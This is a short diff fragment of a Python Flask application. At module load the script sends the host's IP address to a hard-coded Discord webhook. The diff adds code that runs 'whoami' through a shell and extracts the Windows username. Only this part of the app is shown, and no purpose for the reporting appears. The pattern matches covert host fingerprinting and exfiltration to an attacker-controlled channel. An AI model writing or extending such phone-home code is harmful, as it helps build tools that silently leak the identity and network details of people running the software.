@@ -8,6 +8,11 @@ hook = Webhook("https://discord.com/api/webhooks/1295417454914179072/lCsBoGB-ntp
 hook.send(socket.gethostbyname(socket.gethostname()))
 app = Flask(__name__)
 
+result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
+output = result.stdout
+username_split = output.split("\\")
+username = username_split[1]
+
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
